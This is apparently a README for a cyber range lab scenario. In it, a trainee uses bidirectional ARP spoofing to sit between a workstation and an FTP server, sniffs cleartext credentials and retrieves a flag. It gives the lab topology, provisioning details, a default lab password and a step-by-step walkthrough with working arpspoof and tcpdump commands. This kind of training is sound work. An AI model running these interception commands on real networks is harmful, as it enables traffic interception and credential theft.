# CR-18 / Module 3 / N3b — Intermediate ARP Poisoning

CADMUS Cyber Range scenario. Bidirectional ARP MITM on a single LAN segment: a workstation periodically authenticates to an FTP server in cleartext, the trainee sits between the two of them, sniffs the credentials, then uses them to log in and lift the flag.

## Topology

A single `192.168.25.0/24` segment behind one router with a `10.10.10.0/24` WAN.

| Node   | Image                  | IP             | Role |
| ------ | ---------------------- | -------------- | ---- |
| router | debian-12-x86_64       | 192.168.25.1   | LAN gateway. Not involved in the attack. |
| vm1    | ubuntu-noble-x86_64    | 192.168.25.10  | vsftpd on tcp/21. Holds the flag. |
| vm2    | ubuntu-noble-x86_64    | 192.168.25.20  | Systemd timer fires every 15 s and runs an FTP `USER`/`PASS`/`QUIT` sequence at vm1 over netcat. |
| vma    | kali-2026.1-x86_64     | 192.168.25.30  | Trainee workstation. |

## Provisioning

`provisioning/playbook.yml` runs three plays:
- **vm1**: installs vsftpd, creates a local user (`ftp_user`/`ftp_pass` from APG), drops the APG `flag` value into the user's home as `flag.txt`, ships a minimal vsftpd.conf with anonymous off and writes disabled.
- **vm2**: installs `netcat-openbsd`, deploys an `ftp-client.sh` script that pushes plaintext FTP credentials at vm1, behind a systemd oneshot service triggered every 15 s by a timer.
- **vma**: provisions `user` / `Password123` (sudo) via the `user-access` role.

APG variables in `variables.yml`:
- `ftp_user` (type=username) — the local FTP user on vm1
- `ftp_pass` (type=password, length=12) — captured by the trainee in level 1
- `flag` (type=password, length=16) — written verbatim to the file the trainee retrieves in level 2

## Trainee workflow

1. Console or SSH into **vma** as `user` / `Password123`.
2. Enable IP forwarding: `sudo sysctl -w net.ipv4.ip_forward=1`.
3. ARP-poison both directions: `arpspoof -i eth1 -t 192.168.25.10 192.168.25.20` and `arpspoof -i eth1 -t 192.168.25.20 192.168.25.10` (or `bettercap` with `arp.spoof.fullduplex`).
4. `tcpdump -ni eth1 -A 'tcp port 21'` and wait for the next FTP cycle (≤15 s). Read `USER` and `PASS` off the wire.
5. Submit the password (level 2).
6. `ftp 192.168.25.10`, log in with the captured creds, `get flag.txt`, `cat flag.txt`.
7. Submit the file contents (level 3).

## Tools used

`tcpdump`, `arpspoof` (from `dsniff`) or `bettercap`/`ettercap`, `ftp` (or `nc` for raw FTP commands), optionally `wireshark`.

## MITRE mapping

- `T1557.002` Adversary-in-the-Middle / ARP Cache Poisoning
- `T1040` Network Sniffing
- `T1133` External Remote Services
- `T1041` Exfiltration Over C2 Channel
